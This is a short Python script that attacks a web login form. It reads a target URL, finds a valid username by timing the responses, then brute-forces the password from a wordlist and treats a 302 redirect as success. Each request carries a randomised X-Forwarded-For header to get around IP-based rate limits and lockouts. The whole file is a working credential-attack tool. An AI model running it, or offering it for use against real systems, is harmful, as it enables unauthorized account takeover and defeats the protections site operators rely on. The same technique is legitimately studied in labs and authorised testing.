import requests
import time
import random


URL = input('Enter Target Url: ')

#function to format usernames
def username_formatter():
    with open('usernames.txt', 'r') as usr:
        formatted_names = []
        for line in usr:
            names = line.strip()
            formatted_names.append(names)
    return formatted_names


#function to clean and format passwords
def password_formatter():
    with open ('passwords.txt', 'r') as pwd:
        formatted_passwords = []
        for line in pwd:
            passwords = line.strip()
            formatted_passwords.append(passwords)
    return formatted_passwords


def ip_spoofing(): #function to generate random IPs
    A = random.randint(11, 126) #IP range
    B = random.randint(1, 254)
    C = random.randint(1, 254)
    D = random.randint(1, 254)
    return f"{A}.{B}.{C}.{D}"

def enumerate_username(names): #find valid username
    timings = {}
    for name in names:
        fake_ip = ip_spoofing()
        headers = {"X-Forwarded-For": fake_ip} #ip spoof dictionary
        data = {"username": name, "password": 'Qmkt$Rp8Bhdl1$jsjdp$jajnwclf93VnfroT46cs'}
        start = time.time() #initialize start time
        response = requests.post(URL, headers = headers, data = data)
        end = time.time() #end time after sending request
        elapsed_time = end - start  #variable checking and storing  response time
        timings[name] = elapsed_time 
    return max(timings, key=timings.get)

def enumerate_password(name, passwords):
    for password in passwords:
        fake_ip = ip_spoofing()
        headers = {"X-Forwarded-For": fake_ip, "Content-Type": "application/x-www-form-urlencoded"}
        data = {"username": name, "password": password}
        response = requests.post(URL, headers=headers, data=data, allow_redirects=False)
        print(response.status_code, password)
        if response.status_code == 302:
            print(f"Password: {password}")
            return password

valid_username = enumerate_username(username_formatter())
print(valid_username)
if valid_username is not None:
    valid_password = enumerate_password(valid_username, password_formatter())
    print(valid_password)
